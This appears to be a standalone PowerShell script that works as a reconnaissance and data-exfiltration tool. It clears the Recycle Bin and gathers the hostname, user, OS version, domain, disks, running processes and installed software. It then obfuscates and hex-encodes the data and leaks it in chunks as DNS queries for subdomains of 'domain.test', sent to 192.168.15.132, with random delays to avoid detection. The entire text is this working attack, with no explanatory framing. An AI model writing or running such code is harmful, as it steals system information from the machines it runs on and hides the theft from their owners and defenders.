try{Clear-RecycleBin -Force -ErrorAction SilentlyContinue}catch{};$hostname=$env:COMPUTERNAME;$user=$env:USERNAME;$osInfo=Get-CimInstance Win32_OperatingSystem|Select-Object Caption,Version,BuildNumber;$disk=Get-CimInstance Win32_LogicalDisk -Filter "DriveType=3"|Select-Object DeviceID,@{Name="FreeGB";Expression={"{0:N2}" -f ($_.FreeSpace/1GB)}},@{Name="TotalGB";Expression={"{0:N2}" -f ($_.Size/1GB)}};$apps=Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*|Select-Object DisplayName;$procs=Get-Process|Select-Object Name;$domain=(Get-WmiObject Win32_ComputerSystem).Domain;$report=[PSCustomObject]@{Hostname=$hostname;User=$user;OS="$($osInfo.Caption) - $($osInfo.Version) (Build $($osInfo.BuildNumber))";Domain=$domain;DiskInfo=$disk;RunningApps=$procs;InstalledApps=$apps};$json=$report|ConvertTo-Json -Depth 3;$obf=$json -replace 'a','4' -replace 'e','3' -replace 'i','1' -replace 'o','0' -replace 'u','_' -replace '\s','';$chunks=($obf -split '(.{10})'|Where-Object{$_ -ne ''});$domainBase="domain.test";foreach($c in $chunks){$read=([System.Text.Encoding]::UTF8.GetBytes($c)|ForEach-Object{$_.ToString("x2")}) -join "";$sub="$read.$domainBase";try{Resolve-DnsName -Name $sub -Type A -Server 192.168.15.132 -ErrorAction SilentlyContinue|Out-Null}catch{};Start-Sleep -Milliseconds (Get-Random -Minimum 3000 -Maximum 3500)}